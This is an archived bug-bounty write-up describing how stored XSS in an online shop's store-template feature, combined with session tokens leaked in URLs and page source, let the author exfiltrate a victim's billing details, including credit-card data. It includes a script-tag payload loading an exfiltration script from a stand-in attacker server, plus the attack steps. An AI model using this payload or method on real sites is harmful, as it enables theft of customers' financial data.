---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-30_sensitive-data-exfiltration-through-xss-450.md
original_filename: 2022-04-30_sensitive-data-exfiltration-through-xss-450.md
title: Sensitive Data Exfiltration through XSS ($450)
category: documents
detected_topics:
- access-control
- xss
- command-injection
- path-traversal
- otp
tags:
- imported
- documents
- access-control
- xss
- command-injection
- path-traversal
- otp
language: en
raw_sha256: 6277cc7180e4a2e0ba37ad88c720d1e88d474c3027102219dda67d24c2291521
text_sha256: a71bbf07049ac528631dd542163321e85090a786ab4d866e86519062c6b4830e
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Sensitive Data Exfiltration through XSS ($450)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-30_sensitive-data-exfiltration-through-xss-450.md
- Source Type: markdown
- Detected Topics: access-control, xss, command-injection, path-traversal, otp
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `6277cc7180e4a2e0ba37ad88c720d1e88d474c3027102219dda67d24c2291521`
- Text SHA256: `a71bbf07049ac528631dd542163321e85090a786ab4d866e86519062c6b4830e`


## Content

---
title: "Sensitive Data Exfiltration through XSS ($450)"
url: "https://medium.com/system-weakness/sensitive-data-exfiltration-through-xss-450-409162eced3a"
authors: ["Zulfi Al-Farizi"]
bugs: ["Token leak"]
bounty: "450"
publication_date: "2022-04-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2675
scraped_via: "browseros"
---

# Sensitive Data Exfiltration through XSS ($450)

Sensitive Data Exfiltration through XSS ($450)
Zulfi Al-Farizi
Follow
3 min read
·
Apr 30, 2022

56

4

Hello Guys…

This is my first story on medium if there are any typos or miswords please kindly forgive me.

What is Data Exfiltration?

Basically, data exfiltration is a form of a security breach that occurs when an individual’s or company’s data is copied, transferred, or retrieved from a computer or server without authorization. These attacks are typically targeted, with the primary intent being to gain access to a network or machine to locate and copy specific data.

In this article, I’ll show you how I gained my first bounty with this type of vulnerability.

Target Site

Because this is a private bug bounty program let's call the target www.example.com. example.com is an online shop website that has many features like creating store templates, uploading images/CSV files, etc. First of all, I test all the features one by one and got so many xsses on some features but the feature that take my attention the most is creating a store template. Why? because I’m able to create my own HTML and js script as i wish and it did filter some javascript code but not alert()function and <script> tag is allowed (i’m wondering how the developer forget about that ? or he/she got too lazy ?).

Sensitive Token Leaked on URL and Source Page

Firstly i did not realize that my secret token is leaked in url, the url look like this https://www.example.com/cart/default.asp/Configuration&sid=ABCDEF-12345-GHIJKL-67890x0 the value of sid parameter is my secret token then I immediately write that token on my note. With this leakage I wonder “is the token is leaked somewhere else?” so I crawl the website manually and view the source page one by another, it takes some time but finally, I got another 2 (two) token leakage that is in the adding-cart url and store source page (store is the page that anyone can visit).

After that i create another account to see my secret token on the first account (Victim account) with another account (this one is the attacker account), i visit the victim’s store and view the source page:

Press enter or click to view image in full size

yes, this “mid” value is the victim's secret token. With all that I questioned myself again “how can I able to exploit this ? maybe data exfiltration, ATO or another attack ?” so I searched on google for how to exfiltrate data using XSS and I came up with trustedsec article that explain very detailed an attacker can exfiltrate sensitive data through xss.

Exploit

Now all the requirements have gathered it’s time to launch the attack. I clone the script from trustedsec articles and change the required requirements and host it on my private server (you can use ngrok for this) :

Here i want to exfiltrate the Billinfo of the victim it includes the credit cards, email, name, number, company name, address, and country information. The above script will grab the Billinfo page of the victim, encode it to base64 and send it to the attacker's private server part by part.

Get Zulfi Al-Farizi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now on the attacker account:

Create Store Template, inject the XSS payload <script src="https://private.server/ExfilPayload.js in Store Template.
Create any product to sell.
Use the template created before.
Share the store link to the victim.

Once the link is visited by the victim, the attacker will receive the encoded base64 strings:

Press enter or click to view image in full size

Now all I need to do is sort all the encoded part and decode it.

After I submit this vulnerability the program owner reward me $450.

Press enter or click to view image in full size

Thank for reading hope you enjoy it!

Credits:

Trustedsec for the articles, read more here.

Reference:

https://digitalguardian.com/blog/what-data-exfiltration
